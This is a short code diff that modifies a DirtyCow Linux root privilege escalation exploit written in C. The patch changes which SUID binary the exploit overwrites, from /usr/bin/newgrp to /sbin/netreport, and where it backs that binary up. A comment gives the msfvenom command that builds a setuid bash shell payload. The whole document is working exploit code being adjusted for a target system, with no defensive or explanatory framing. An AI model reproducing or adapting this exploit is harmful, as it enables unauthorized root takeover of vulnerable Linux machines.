@@ -36,7 +36,7 @@ pthread_t pth;
 struct stat st;
 
 // change if no permissions to read
-char suid_binary[] = "/usr/bin/newgrp";
+char suid_binary[] = "/sbin/netreport";
 
 /*
 * $ ./msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
@@ -103,8 +103,8 @@ int main(int argc,char *argv[]){
 ", suid_binary);
   char *backup;
   printf("DirtyCow root privilege escalation\n");
-  printf("Backing up %s to /tmp/bak\n", suid_binary);
-  asprintf(&backup, "cp %s /tmp/bak", suid_binary);
+  printf("Backing up %s to ./bak\n", suid_binary);
+  asprintf(&backup, "cp %s ./bak", suid_binary);
   system(backup);
 
   f=open(suid_binary,O_RDONLY);
